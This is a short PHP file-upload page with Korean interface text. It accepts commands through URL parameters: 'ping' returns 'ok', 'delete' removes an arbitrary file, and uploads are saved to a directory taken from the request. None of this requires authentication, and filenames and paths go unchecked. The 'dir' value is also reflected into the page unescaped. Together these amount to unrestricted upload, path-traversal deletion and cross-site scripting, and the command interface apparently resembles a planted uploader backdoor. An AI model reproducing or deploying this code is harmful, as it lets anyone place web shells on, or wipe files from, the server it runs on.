<?
if(!$dir){
	$dir = "./";
}

if ($_GET["cmd"] == "ping") {
	echo "ok";
	exit;
}
else if ($_GET["cmd"] == "delete") {
	$path = $dir.$_GET["fileN"];
	unlink($path);
	echo "ok";
	exit;
}

if($_FILES){

	if(!is_dir($dir)){
		if(!mkdir($dir)){
			echo ("<script>alert('디렉토리 생성불가.');history.back();</script>"); 
			exit; 
		}
	}
	if(!move_uploaded_file($_FILES["fileN"]["tmp_name"], $dir.$_FILES["fileN"]["name"] )){
		echo ("<script>alert('지정한 위치로 이동 불가.');history.back();</script>");
		exit;
	}else{
		echo ("업로드 되었습니다.");
		exit;
	}
}
?>

<script>
function checkFirst(form){
	if(!form.fileN.value){
		alert('파일을 선택하시오.');
		form.fileN.focus();
		return;
	}
	showHuman('d');
	form.submit();
}

function showHuman(r1){
	if(r1 == "s"){
		var view = "";
		var view1 = "none";

	}else{
		var view = "none";
		var view1 = "";
	}
	var object = eval("document.all.submit_ing");
	object.style.display=view;
	var object = eval("document.all.submit_ing_re");
	object.style.display=view1;
}
</script>

<center>
<body bgcolor="#FFFFFF" onload="showHuman('s');">
<table cellpadding =1 cellspacing=1 border=0>
	<form name="upFile" method="post" action="<?=$PHP_SELF?>?dir=<?=$_GET["dir"]?>" enctype="multipart/form-data">
	<tr >
		<td>
			열기<input type="file" name="fileN" size=25><br>
		</td>
	</tr>
	<tr id="submit_ing">
		<td >
			<input type="button" value="업로드!!" onclick="checkFirst(document.upFile);">
		</td>
	</tr>
	<tr id="submit_ing_re" style="DISPLAY:none;">
		<td>
			<marquee>잠시만 기다려 주세요!! 입력중입니다.</marquee>
		</td>
	</tr>
</form>
</table>
</center>